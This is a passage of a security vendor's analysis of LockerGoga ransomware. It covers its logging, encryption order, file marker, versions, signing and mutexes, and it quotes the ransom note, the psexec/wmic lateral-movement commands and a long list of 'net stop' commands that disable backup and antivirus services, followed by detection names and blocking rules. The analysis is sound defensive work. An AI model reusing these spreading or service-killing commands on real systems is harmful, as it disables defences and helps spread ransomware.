Logging\nDescription: The image displays a code snippet, likely from a disassembled or decompiled program, showing a logging function related to the LockerGoga ransomware. The highlighted section includes references to the function 'Create_log_file' and appears to detail memory addresses and associated function calls. The background color is a light green, and the text is formatted in a monospaced font, typical for programming or debugging contexts. This image provides technical insights into how the ransomware logs its activities, making it relevant to the analysis of the malware's behavior.\nTranscription: |\n  Create_log_file\n  \n  XREF[18]:    FUN_0040b120:0040b2b5(*),\n               FUN_0040d0d0:0040d2ce(*),\n               FUN_0040d0d0:0040d941(*),\n               0040dbb2(*), 0040e70c(*),\n               0040f152(*), 0040f2a5(*),\n               FUN_0040fa40:0040fabe(*),\n               FUN_0040fa40:0040fd18(*),\n               FUN_0040fa40:0041031f(*),\n               FUN_0041cf90:0041cffb(*),\n               FUN_0041d070:0041d0bb(*),\n               FUN_0041d150:0041d1be(*),\n               FUN_0041d250:0041d2be(*),\n               FUN_0041d330:0041d39b(*),\n               FUN_0041d6f0:0041d75e(*),\n               FUN_0041d8d0:0041d93b(*),\n               FUN_0041d9b0:0041da18(*)\n  \n  004fcc4c  63 3a 2f          ds         \"c:/log\"\n           2e 6c 6f\n           67 00\n```\n\nDuring execution we enabled the log function and saw how the ransomware encrypts the system, causing high CPU usage and opening the ransom note during the process. This is the aspect in an infected system:\n\n```image\nAlt: Infected system\nDescription: The image displays a Notepad window showing two text files related to a ransomware attack. The left section contains a ransom note titled 'README_LOCKED.txt,' which informs the victim about their files being encrypted, details payment instructions in Bitcoin, and emphasizes not to reset or rename files. The right section shows a log file with scanning results, listing directories and files being processed or targeted by the ransomware. It reveals the ransomware's activity during the encryption process.\n```\n\nAs we executed the sample with the log function, we could access this file to check the status of the encryption. Obviously, this is most likely a debug function used by the developer.\n\n```image\nAlt: Debug function\nDescription: The image is a screenshot of a text log displayed in a Notepad window. It shows a series of scanning results, indicating the paths and files being processed within the Metasploit framework. Each line lists a specific file within the directory structure, with indications of scanning progress (e.g., [0/3546], [1/3562], etc.). This log reflects the technical details of the execution process related to the use of Metasploit, which is often employed in cybersecurity contexts, including penetration testing and analysis of malware.\nTranscription: |\n  scanning...\n  [1/0/3546]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\abc.py\n  [2/0/3546]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\aifc.py\n  [3/0/3545]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\anydbm.py\n  [4/0/3545]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\csv.py\n  [5/0/3544]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\cp852.py\n  [4/1/3562]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\csv.py\n  [5/1/3562]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\mac_romanian.py\n  [4/2/3562]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\cp852.py\n  [5/2/3561]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\mac_turkish.py\n  [4/3/3567]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\anydbm.py\n  [3/4/3567]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\mac_turkish.py\n  [4/4/3566]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\unicode_internal.py\n  [4/5/3566]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\aifc.py\n  [4/5/3565]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\utf_8.py\n  [3/6/3565]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\abc.py\n  [4/6/3565]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\utf_8_sig.py\n  [5/6/3565]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\uu_codec.py\n  [4/7/3566]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\mac_romanian.py\n  [5/7/3565]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\genericpath.py\n  [4/8/3565]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\unicode_internal.py\n  [5/8/3564]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\cp852.py\n  [4/9/3564]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\hmac.py\n  [5/9/3565]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\utf_8_sig.py\n  [4/10/3565]>C:\\metasploit-framework\\embedded\\devkit\\mingw\\bin\\lib\\encodings\\utf_8.py\n```\n\nIn order to know how the ransomware works, and with the help of the log function enabled, we could establish the order of LockerGoga to encrypt the system:\n\n- Log file creation in the C: drive\n- Folder and file enumeration\n- File encryption & ransom note creation in the desktop folder.\n\n```image\nAlt: Encryption\nDescription: The image is a screenshot of log entries displaying operations performed by a process named 'imtvkqnqq3356.exe'. It shows the timestamp of each operation, the process ID (PID), the operation type (CreateFile), the file path (C:\\.\\log), and the result of each operation ('SUCCESS' or 'NAME NOT FOUND'). This log provides valuable insights into the behavior of the LockerGoga ransomware, specifically indicating the creation of log files during its execution.\nTranscription: |\n  | Time of Day        | Process Name     | PID  | Operation  | Path    | Result         |\n  | ------------------ | ---------------- | ---- | ---------- | ------- | -------------- |\n  | 7:45:02.8685269 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | NAME NOT FOUND |\n  | 7:45:02.8761462 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:02.9230699 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:02.9231487 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:02.9232311 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:02.9218166 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:07.9118587 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:07.9123518 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:07.9126042 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:07.9380866 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:07.9382213 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:07.9409198 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:07.9412174 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:07.9414888 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:07.9416084 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n  | 7:45:07.9450030 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\.log | SUCCESS        |\n```\n\nOne interesting thing to mention is that, before encrypting any file in the system, the malware will search for files in the trashcan folder as the first option. We are not certain why it takes this unusual step, though it could be because many people do not empty their recycle bins and the ransomware is looking to encrypt even those files that may no longer be required:\n\n```image\nAlt: Recycle Bin\nDescription: The image displays a log of file operations performed by the LockerGoga ransomware on a Windows system. It includes a list of processes created, file operations, and searches conducted by the ransomware, specifically targeting directories like the Recycle Bin and the Windows directory. The log entries indicate the files accessed and the actions taken, which are relevant to understanding the ransomware's behavior during an attack.\nTranscription: |\n  Process Created\n      c:\\users\\admini~1\\appdata\\local\\temp\\imtvknqq1464.exe\n      c:\\users\\admini~1\\appdata\\local\\temp\\imtvknqq1464.exe -i sm-imtvknqq -s\n  \n  File Operations, miscellaneous\n      Searched a directory for the name: C:\\$Recycle.Bin\\*\n  \n  File Operations, miscellaneous\n      Retrieved the path of the Windows directory\n  \n  File Operations, miscellaneous\n      Searched a directory for the name: C:\\*\n```\n\nLockerGoga will start to enumerate all the folders and files in the system to start the encryption process. This enumeration is done in parallel, so we can expect the process wouldn’t take much time.\n\nAfter the enumeration, the ransomware will create the ransom note for the victim:\n\n```image\nAlt: Ransom note\nDescription: The image is a table displaying a log of file operations executed by a process named 'imtvknqq3356.exe'. It includes columns for the time of day, process name, process ID (PID), operation performed (CreateFile), the file path where the operation occurred, and the result of the operation (SUCCESS). The entries show multiple instances of the process creating a ransom note file named 'README_LOCKED.txt' on the user's desktop.\nTranscription: |\n  | Time of Day        | Process Name     | PID  | Operation  | Path                                      | Result  |\n  | ------------------ | ---------------- | ---- | ---------- | ----------------------------------------- | ------- |\n  | 7:45:06.1997729 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\Users\\Public\\Desktop\\README_LOCKED.txt | SUCCESS |\n  | 7:45:06.1998836 AM | imtvknqq3356.exe | 3216 | CreateFile | C:\\Users\\Public\\Desktop\\README_LOCKED.txt | SUCCESS |\n  | 7:45:08.0494989 AM | imtvknqq3356.exe | 3816 | CreateFile | C:\\Users\\Public\\Desktop\\README_LOCKED.txt | SUCCESS |\n  | 7:45:08.0514671 AM | imtvknqq3356.exe | 2864 | CreateFile | C:\\Users\\Public\\Desktop\\README_LOCKED.txt | SUCCESS |\n  | 7:45:08.0524712 AM | imtvknqq3356.exe | 3512 | CreateFile | C:\\Users\\Public\\Desktop\\README_LOCKED.txt | SUCCESS |\n  | 7:45:08.3720789 AM | imtvknqq3356.exe | 2956 | CreateFile | C:\\Users\\Public\\Desktop\\README_LOCKED.txt | SUCCESS |\n  | 7:45:08.4347811 AM | imtvknqq3356.exe | 2280 | CreateFile | C:\\Users\\Public\\Desktop\\README_LOCKED.txt | SUCCESS |\n  | 7:45:08.4542508 AM | imtvknqq3356.exe | 3876 | CreateFile | C:\\Users\\Public\\Desktop\\README_LOCKED.txt | SUCCESS |\n  | 7:45:40.9457507 AM | imtvknqq3356.exe | 316  | CreateFile | C:\\Users\\Public\\Desktop\\README_LOCKED.txt | SUCCESS |\n  | 7:45:41.1131180 AM | imtvknqq3356.exe | 4052 | CreateFile | C:\\Users\\Public\\Desktop\\README_LOCKED.txt | SUCCESS |\n```\n\nThe ransom note was created in parallel with the encrypted files, and it is hardcoded inside the sample:\n\n```image\nAlt: Hardcoding\nDescription: The image displays a portion of code from a disassembly or debugging tool, showcasing textual data related to the LockerGoga ransomware. Key elements include a string indicating an email address (\"SayanWalsworth96@protonmail.com\") and a reference to a ransom note file named \"README_LOCKED.txt\". The highlighted sections suggest the presence of functions related to the ransomware's operation and the specific content of the ransom note, which typically instructs victims on how to proceed after their files have been encrypted.\nTranscription: |\n  s_SayanWalsworth96@protonmail.com_R_004fe944\n  004fe944  53 61 79    ds    \"SayanWalsworth96@protonmail.com\\nRezawyreEdip...\n            61 6e 57\n            61 6c 73  ...\n  \n                          XREF[1]:    FUN_0043fa60:0043fcfb(*)\n  \n  DAT_004fe97c\n  004fe97c  0a          ??    0Ah\n  004fe97d  00          ??    00h\n  004fe97e  00          ??    00h\n  004fe97f  00          ??    00h\n  \n                          XREF[2]:    FUN_0043fa60:0043fd00(*),\n                                      FUN_0045cd90:0045ce08(*)\n  \n  s_README_LOCKED.txt_004fe980\n  004fe980  52 45 41    ds    \"README_LOCKED.txt\"\n            44 4d 45\n            5f 4c 4f  ...\n  \n  004fe992  00          ??    00h\n  004fe993  00          ??    00h\n  \n                          XREF[2]:    FUN_0043fa60:0043fa9c(*),\n                                      FUN_0043fe30:0043fe39(*)\n```\n\nLike other ransomware families, LockerGoga will create the ransom note file to ask the user to pay to recover their encrypted files. We highly recommend not paying under any circumstance so as not to continue funding an underground business model. In case of a ransomware infection, please check https://www.nomoreransom.org.\n\nBelow is an example of the ransom note content on an infected machine:\n\n> Greetings!\n>\n> There was a significant flaw in the security system of your company.\n>\n> You should be thankful that the flaw was exploited by serious people and not some rookies.\n>\n> They would have damaged all of your data by mistake or for fun.\n>\n> Your files are encrypted with the strongest military algorithms RSA4096 and AES-256.\n>\n> Without our special decoder it is impossible to restore the data.\n>\n> Attempts to restore your data with third party software as Photorec, RannohDecryptor etc. will lead to irreversible destruction of your data.\n>\n> To confirm our honest intentions, send us 2-3 different random files and you will get them decrypted.\n>\n> It can be from different computers on your network to be sure that our decoder decrypts everything.\n>\n> Sample files we unlock for free (files should not be related to any kind of backups).\n>\n> We exclusively have decryption software for your situation.\n>\n> DO NOT RESET OR SHUTDOWN – files may be damaged.\n>\n> DO NOT RENAME the encrypted files.\n>\n> DO NOT MOVE the encrypted files.\n>\n> This may lead to the impossibility of recovery of the certain files.\n>\n> The payment has to be made in Bitcoins.\n>\n> The final price depends on how fast you contact us.\n>\n> As soon as we receive the payment you will get the decryption tool and instructions on how to improve your systems security.\n>\n> To get information on the price of the decoder contact us at:\n\nIn parallel with the ransom note creation, the files will start to be encrypted by LockerGoga with the `.locked` extension appended to all files. This extension has been broadly used by other ransomware families in the past:\n\n```image\nAlt: Locked Extension\nDescription: The image appears to be a screenshot of code, likely extracted from a binary or a debugging session, showing specific strings related to the LockerGoga ransomware. It includes Unicode representations of file extensions and markers used by the ransomware, such as 'u\".locked\"' which indicates the file extension that LockerGoga appends to encrypted files. Additionally, it displays other Unicode strings that may relate to the ransomware's functionality or configuration.\nTranscription: |\n  41 30 47 ...\n  \n  004fe904  2e 00 6c  00 6f 00  63 00 6b  ...\n  \n  u_.locked_004fe904\n  unicode  u\".locked\"\n  \n  004fe914  5c 00 3f  00 3f 00  5c 00 5c  ...\n  \n  u_\\\\??\\\\_004fe914\n  unicode  u\"\\\\??\\\\\"\n```\n\nLockerGoga has embedded in the code the file extensions that it will encrypt. Below is an example:\n\n```image\nAlt: File Extensions\nDescription: The image displays a snippet of code or data that appears to be related to file extensions recognized by the LockerGoga ransomware. It includes hexadecimal and ASCII representations of different file types, such as \".docx\", \".doc\", and \".dotx\", among others. The context suggests that this data is part of the ransomware's functionality to identify which files to target during the encryption process.\nTranscription: |\n  004fcafc  2e 64 6f        ds         \".docx\"\n  004fcb00  63 78 00\n  004fcb02  00              ??         00h\n  004fcb03  00              ??         00h\n  \n  004fcb04  2e 64 6f        ds         \".docb\"\n            63 62 00\n  \n  004fcb0a  00              ??         00h\n  004fcb0b  00              ??         00h\n  \n  004fcb0c  2e 64 6f        ds         \".dotx\"\n            74 78 00\n  \n  004fcb12  00              ??         00h\n  004fcb13  00              ??         00h\n  \n  004fcb14  64              ??         64h    d\n  004fcb15  6f              ??         6Fh    o\n```\n\nThe sample has also configured some locations and files that will be skipped in the encryption process so as not to disrupt the Operating System from running.\n\nAll the files encrypted by this ransomware will have a specific FileMarker inside:\n\n```image\nAlt: File Marker\nDescription: The image displays a hexadecimal dump, which is a representation of binary data in a readable format. In this specific dump, a notable string \"GOGA1440:\" is highlighted in red, indicating it is likely a marker or identifier related to the LockerGoga ransomware variant version 1440. The surrounding data consists of seemingly random hexadecimal values and characters, which typically correspond to the encoded content of the ransomware's executable file.\n```\n\n**Note:** The FileMarker identifies the ransomware family and the most likely version; in this case, it is 1440.\n\nDuring the investigation, we identified the following versions:\n\n- 1200\n- 1510\n- 1440\n- 1320\n\nBased on the binary compile time and the extracted versions, we observed that the actors were creating different versions of LockerGoga for different targets/campaigns.\n\n```image\nAlt: Different versions\nDescription: The image is a flow diagram illustrating the evolution and activity of different versions of the LockerGoga ransomware (versions 1200, 1320, 1440, and 1510) over a series of dates in 2018 and 2019. Each version is represented on the left side, with colored bands connecting to corresponding dates on the right, showing the flow of version updates or activities on specific days. This visual representation highlights the timeline and changes in the ransomware's development and deployment.\n```\n\nAfter encrypting, LockerGoga executes `cipher.exe` to remove the free space to prevent file recovery in the infected system. When files are deleted on a system, sometimes they are still available in the free space of a hard disk and can theoretically be recovered.\n\n```image\nAlt: Free Space\nDescription: The image displays a technical analysis of a ransomware component, specifically showing a code snippet that references the execution of 'cipher.exe', which is likely part of the LockerGoga ransomware's functionality. The code includes hexadecimal values alongside corresponding ASCII characters, indicating how the string 'cipher.exe' is embedded within the ransomware's code. This suggests an analysis of the ransomware's behavior during the encryption process, providing insight into its operation.\nTranscription: |\n  s_cipher.exe_004fcc74                     XREF[1]:\n  004fcc74  63 69 70     ds       \"cipher.exe\"         0040e41a(*)\n            68 65 72\n            2e 65 78  ...\n  004fcc7f  00          ??       00h\n```\n\n### Samples digitally signed:\n\nDuring our triage phase, we found that some of the LockerGoga samples are digitally signed. We are observing from ATR that the latest ransomware pieces used a lower scale and more focused are released digitally signed:\n\n- MIKL LIMITED\n- ALISA LTD\n- KITTY’S LTD\n\nDigitally signing the malware could help the attackers to bypass some of the security protections in the system.\n\nAs part of the infection process, LockerGoga will create a static mutex value in the system, always following the same format:\n\n*MX-[a-z]\\w+*\n\nExamples of mutex found:\n\n- MX-imtvknqq\n- MX-tgytutrc\n- MX-zzbdrimp\n\n### Interesting strings found\n\nIn our analysis, we extracted more strings from the LockerGoga samples, with interesting references to:\n\n- LockerGoga\n- crypto-locker\n  - goga\n  - `E:\\\\crypto-locker\\\\cryptopp\\\\src\\\\crc_simd.cpp`\n  - `E:\\\\crypto-locker\\\\cryptopp\\\\src\\\\rijndael_simd.cpp`\n  - `E:\\\\crypto-locker\\\\cryptopp\\\\src\\\\sha_simd.cpp`\n  - `E:\\\\crypto-locker\\\\cryptopp\\\\src\\\\sse_simd.cpp`\n  - `E:\\\\goga\\\\cryptopp\\\\src\\\\crc_simd.cpp`\n  - `E:\\\\goga\\\\cryptopp\\\\src\\\\rijndael_simd.cpp`\n  - `E:\\\\goga\\\\cryptopp\\\\src\\\\sha_simd.cpp`\n  - `E:\\\\goga\\\\cryptopp\\\\src\\\\sse_simd.cpp`\n  - `X:\\\\work\\\\Projects\\\\LockerGoga\\\\cl-src-last\\\\cryptopp\\\\src\\\\crc_simd.cpp`\n  - `X:\\\\work\\\\Projects\\\\LockerGoga\\\\cl-src-last\\\\cryptopp\\\\src\\\\rijndael_simd.cpp`\n  - `X:\\\\work\\\\Projects\\\\LockerGoga\\\\cl-src-last\\\\cryptopp\\\\src\\\\sha_simd.cpp`\n  - `X:\\\\work\\\\Projects\\\\LockerGoga\\\\cl-src-last\\\\cryptopp\\\\src\\\\sse_simd.cpp`\n\nThe malware developers usually forget to remove those strings in their samples and we can use them to identify new families or frameworks used in their development.\n\n### Spreading methods:\n\nThe malware is known to be spread in the local network through remote file copy. To do that, a set of `.batch` files are copied to the remote machines TEMP folder using simple copy:\n\n- `copy xax.bat \\\\123.123.123.123\\c$\\windows\\temp`\n\nThe malware will copy itself and the tool `PSEXEC.EXE` to the same location. Once all the files are copied, the malware will run the `.BAT` file using the following command:\n\n- `start psexec.exe \\\\123.123.123.123 -u domain\\user -p “pass” -d -h -r mstdc -s accepteula -nobanner c:\\windows\\temp\\xax.bat`\n\nEach of these `.BAT` files contains lines to execute the malware on remote machines. They use the following command:\n\n- `start wmic /node:”123.123.123.123″ /user:”domain\\user” /password:”pass” process call create “cmd /c c:\\windows\\temp\\kill.bat”`\n\nThe batch file above attempts to kill several AV products and disable security tools. At the end of the script, the malware copy on the remote machine is executed from `c:\\windows\\temp\\taskhost.exe`.\n\nDue to the presence of these batch files and the fact that the malware binary makes no direct reference to them, we believe that the spreading mechanism is executed manually by an attacker or via an unknown binary. The path, username, and passwords are hardcoded in the scripts which indicate the attacker had previous knowledge of the environment.\n\nThe following is a list of all the processes and services disabled by the malware:\n\nOne batch file found in the infected systems where LockerGoga was executed will stop services and processes regarding critical services in the system and security software:\n\n| Command                                       | Command                                      |\n| --------------------------------------------- | -------------------------------------------- |\n| `net stop BackupExecAgentAccelerator /y`      | `net stop McAfeeEngineService /y`            |\n| `net stop BackupExecAgentBrowser /y`          | `net stop McAfeeFramework /y`                |\n| `net stop BackupExecDeviceMediaService /y`    | `net stop McAfeeFrameworkMcAfeeFramework /y` |\n| `net stop BackupExecJobEngine /y`             | `net stop McTaskManager /y`                  |\n| `net stop BackupExecManagementService /y`     | `net stop mfemms /y`                         |\n| `net stop BackupExecRPCService /y`            | `net stop mfevtp /y`                         |\n| `net stop BackupExecVSSProvider /y`           | `net stop MMS /y`                            |\n| `net stop bedbg /y`                           | `net stop mozyprobackup /y`                  |\n| `net stop DCAgent /y`                         | `net stop MsDtsServer /y`                    |\n| `net stop EPSecurityService /y`               | `net stop MsDtsServer100 /y`                 |\n| `net stop EPUpdateService /y`                 | `net stop MsDtsServer110 /y`                 |\n| `net stop EraserSvc11710 /y`                  | `net stop MSExchangeES /y`                   |\n| `net stop EsgShKernel /y`                     | `net stop MSExchangeIS /y`                   |\n| `net stop FA_Scheduler /y`                    | `net stop MSExchangeMGMT /y`                 |\n| `net stop IISAdmin /y`                        | `net stop MSExchangeMTA /y`                  |\n| `net stop IMAP4Svc /y`                        | `net stop MSExchangeSA /y`                   |\n| `net stop macmnsvc /y`                        | `net stop MSExchangeSRS /y`                  |\n| `net stop masvc /y`                           | `net stop MSOLAP$SQL_2008 /y`                |\n| `net stop MBAMService /y`                     | `net stop MSOLAP$SYSTEM_BGC /y`              |\n| `net stop MBEndpointAgent /y`                 | `net stop MSOLAP$TPS /y`                     |\n| `net stop McShield /y`                        | `net stop MSSQLFDLauncher$TPS /y`            |\n| `net stop MSOLAP$TPSAMA /y`                   | `net stop MSSQLFDLauncher$TPSAMA /y`         |\n| `net stop MSSQL$BKUPEXEC /y`                  | `net stop MSSQLSERVER /y`                    |\n| `net stop MSSQL$ECWDB2 /y`                    | `net stop MSSQLServerADHelper100 /y`         |\n| `net stop MSSQL$PRACTICEMGT /y`               | `net stop MSSQLServerOLAPService /y`         |\n| `net stop MSSQL$PRACTTICEBGC /y`              | `net stop MySQL57 /y`                        |\n| `net stop MSSQL$PROFXENGAGEMENT /y`           | `net stop ntrtscan /y`                       |\n| `net stop MSSQL$SBSMONITORING /y`             | `net stop OracleClientCache80 /y`            |\n| `net stop MSSQL$SHAREPOINT /y`                | `net stop PDVFSService /y`                   |\n| `net stop MSSQL$SQL_2008 /y`                  | `net stop POP3Svc /y`                        |\n| `net stop MSSQL$SYSTEM_BGC /y`                | `net stop ReportServer /y`                   |\n| `net stop MSSQL$TPS /y`                       | `net stop ReportServer$SQL_2008 /y`          |\n| `net stop MSSQL$TPSAMA /y`                    | `net stop ReportServer$SYSTEM_BGC /y`        |\n| `net stop MSSQL$VEEAMSQL2008R2 /y`            | `net stop ReportServer$TPS /y`               |\n| `net stop MSSQL$VEEAMSQL2012 /y`              | `net stop ReportServer$TPSAMA /y`            |\n| `net stop MSSQLFDLauncher /y`                 | `net stop RESvc /y`                          |\n| `net stop MSSQLFDLauncher$PROFXENGAGEMENT /y` | `net stop sacsvr /y`                         |\n| `net stop MSSQLFDLauncher$SBSMONITORING /y`   | `net stop SamSs /y`                          |\n| `net stop MSSQLFDLauncher$SHAREPOINT /y`      | `net stop SAVAdminService /y`                |\n| `net stop MSSQLFDLauncher$SQL_2008 /y`        | `net stop SAVService /y`                     |\n| `net stop MSSQLFDLauncher$SYSTEM_BGC /y`      | `net stop SQLSafeOLRService /y`              |\n| `net stop MSOLAP$TPSAMA /y`                   | `net stop SQLSERVERAGENT /y`                 |\n| `net stop MSSQL$BKUPEXEC /y`                  | `net stop SQLTELEMETRY /y`                   |\n| `net stop MSSQLFDLauncher$TPS /y`             | `net stop SQLTELEMETRY$ECWDB2 /y`            |\n| `net stop MSSQLFDLauncher$TPSAMA /y`          | `net stop SQLWriter /y`                      |\n| `net stop SDRSVC /y`                          | `net stop SstpSvc /y`                        |\n| `net stop SepMasterService /y`                | `net stop svcGenericHost /y`                 |\n| `net stop ShMonitor /y`                       | `net stop swi_filter /y`                     |\n| `net stop Smcinst /y`                         | `net stop swi_service /y`                    |\n| `net stop SmcService /y`                      | `net stop swi_update_64 /y`                  |\n| `net stop SMTPSvc /y`                         | `net stop TmCCSF /y`                         |\n| `net stop SNAC /y`                            | `net stop tmlisten /y`                       |\n| `net stop SntpService /y`                     | `net stop TrueKey /y`                        |\n| `net stop sophossps /y`                       | `net stop TrueKeyScheduler /y`               |\n| `net stop SQLAgent$BKUPEXEC /y`               | `net stop TrueKeyServiceHelper /y`           |\n| `net stop SQLAgent$ECWDB2 /y`                 | `net stop UI0Detect /y`                      |\n| `net stop SQLAgent$PRACTTICEBGC /y`           | `net stop VeeamBackupSvc /y`                 |\n| `net stop SQLAgent$PRACTTICEMGT /y`           | `net stop VeeamBrokerSvc /y`                 |\n| `net stop SQLAgent$PROFXENGAGEMENT /y`        | `net stop VeeamCatalogSvc /y`                |\n| `net stop SQLAgent$SBSMONITORING /y`          | `net stop VeeamCloudSvc /y`                  |\n| `net stop SQLAgent$SHAREPOINT /y`             | `net stop VeeamDeploymentService /y`         |\n| `net stop SQLAgent$SQL_2008 /y`               | `net stop VeeamDeploySvc /y`                 |\n| `net stop SQLAgent$SYSTEM_BGC /y`             | `net stop VeeamEnterpriseManagerSvc /y`      |\n| `net stop SQLAgent$TPS /y`                    | `net stop VeeamMountSvc /y`                  |\n| `net stop SQLAgent$TPSAMA /y`                 | `net stop VeeamNFSSvc /y`                    |\n| `net stop SQLAgent$VEEAMSQL2008R2 /y`         | `net stop VeeamRESTSvc /y`                   |\n| `net stop SQLAgent$VEEAMSQL2012 /y`           | `net stop VeeamTransportSvc /y`              |\n| `net stop SQLBrowser /y`                      | `net stop W3Svc /y`                          |\n| `net stop SDRSVC /y`                          | `net stop wbengine /y`                       |\n| `net stop SepMasterService /y`                | `net stop WRSVC /y`                          |\n| `net stop ShMonitor /y`                       | `net stop MSSQL$VEEAMSQL2008R2 /y`           |\n| `net stop VeeamDeploymentService /y`          | `net stop SQLAgent$VEEAMSQL2008R2 /y`        |\n| `net stop VeeamDeploySvc /y`                  | `net stop VeeamHvIntegrationSvc /y`          |\n| `net stop VeeamEnterpriseManagerSvc /y`       | `net stop KAVFSGT /y`                        |\n| `net stop VeeamMountSvc /y`                   | `net stop KAVFS /y`                          |\n| `net stop VeeamNFSSvc /y`                     | `net stop mfefire /y`                        |\n| `net stop VeeamRESTSvc /y`                    | `net stop SentinelAgent /y`                  |\n| `net stop VeeamTransportSvc /y`               | `net stop SentinelHelperService /y`          |\n| `net stop W3Svc /y`                           | `net stop LogProcessorService /y`            |\n| `net stop wbengine /y`                        | `net stop EPUpdateService /y`                |\n\n## New ransomware, new features, but still room to improve\n\nWe will continue tracking LockerGoga, but we have already seen some interesting features never seen before, such as parallel tasking encrypting the system or log files for debugger purposes. We did not see any spreading method used to deliver LockerGoga so it would be fair to assume it is used in targeted campaigns after the attackers had access to the system. At the time of this analysis, all the samples are not packed, or have complex methods of protection from being executed inside a sandbox system, though this could change in the near future.\n\nAlso, during the analysis, we observed LockerGoga encrypting legitimate DLLs, breaking the functionality of certain applications in the system, and also ciphering itself during the process, causing a crash:\n\n```image\nAlt: Broken Functionality\nDescription: The image depicts a computer application error message, indicating that the application 'imtvknqq6561.exe' was unable to start correctly due to a specific error code (0xc0000142). In the background, there is a blurred view of a file path that includes various system files, suggesting that the context is related to software or application processes in a potentially compromised environment. This aligns with the discussion of the LockerGoga ransomware's impact on legitimate applications and system functionality.\nTranscription: |\n  imtvknqq6561.exe - Application Error\n  \n  The application was unable to start correctly (0xc0000142).\n  Click OK to close the application.\n  \n  [ OK ]\n```\n\nWe expect all these errors will be fixed with further development of the malware.\n\n## Observations:\n\nThe McAfee ATR team is observing how some new ransomware players in the cybersecurity field are reusing, or at least only making some minor modifications to, some features used by other ransomware families.\n\nIn the case of LockerGoga we can observe the following in:\n\n- Sectigo as a certificate, also used to digitally sign the certificate\n- Ransom note slightly modified from Ryuk Ransomware\n- Specific FileMarker used to flag the encrypted files\n- No BTC address used in the ransom note, meaning victims must make contact directly by email, something that we have seen elsewhere in our latest investigations.\n\n## MITRE ATT&CK Coverage:\n\n- Hooking\n- Kernel Modules and Extensions\n- Process Injection\n- Code Signing\n- Query Registry\n- Process Discovery\n- Data Compressed\n\n## McAfee coverage:\n\n**Detection names:**\n\n- RansomCLock-FAL!A5BC1F94E750\n- Ransom-Goga!E11502659F6B\n- Trojan-Ransom\n- Ransom-Goga!438EBEC995AD\n- Trojan-FQSS!3B200C8173A9\n- RansomCLock-FAL!A1D732AA27E1\n- Ransom-Goga!C2DA604A2A46\n- Ransom-O\n- Trojan-FPYT!BA53D8910EC3\n- Ransom-FQPT!FAF4DE4E1C5D\n- RansomCLock-FAL!3EBCA21B1D4E\n- RansomCLock-FAL!E8C7C902BCB2\n- Ransom-Goga!E11502659F6B\n- Generic.bvg\n- Ransom-Goga!16BCC3B7F32C\n\n**Expert Rules**\n\nThe following expert rules can be used in Endpoint Security to block the malware from spreading. These rules are aggressive and may cause false positives, so make sure they are removed once the environment is cleaned:\n\n```\nRule {\n    Process {\n        Include OBJECT_NAME { -v “SYSTEM:REMOTE” }\n    }\n    Target {\n        Match FILE {\n            Include OBJECT_NAME { -v “c:\\\\windows\\\\temp\\\\*.exe” }\n            Include OBJECT_NAME { -v “c:\\\\windows\\\\temp\\\\*.bat” }\n            Include -access “CREATE”\n        }\n    }\n}\nRule {\n    Process {\n        Include OBJECT_NAME { -v “WmiPrvSE.exe” }\n    }\n    Target {\n        Match PROCESS {\n            Include OBJECT_NAME { -v “cmd.exe”}\n            Include -access “CREATE”\n        }\n    }\n}\n```\n\nCustomers can also add the following Access Protection rule to prevent the creation of encrypted files on the victim host:\n\n**Prescriptive guidance**\n\nIt is advisable for customers to undertake appropriate risk 